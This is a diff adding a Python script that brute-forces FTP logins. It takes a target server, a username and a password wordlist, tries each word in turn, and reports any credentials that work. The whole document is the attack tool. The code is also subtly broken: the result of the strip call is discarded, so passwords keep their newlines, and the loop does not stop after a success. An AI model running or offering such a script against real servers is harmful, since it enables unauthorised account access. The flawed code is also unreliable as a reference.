@@ -1,0 +1,20 @@
+import ftplib
+
+server = input("Server: ")
+user = input("Username: ")
+wordlist = input("Path to word list: ")
+
+try:
+    with open(wordlist, "r") as pw:
+        for word in pw:
+            word.strip("\r\n")
+            try:
+                ftp = ftplib.FTP(server)
+                ftp.login(user, word)
+                print(f"[*] Found credentials: {user}:{word}")
+                ftp.quit()
+            except ftplib.error_perm as err:
+                print("[-] Wrong credentials.", err)
+except FileNotFoundError as err:
+    print("[-] Wordlist not found.", err)
+
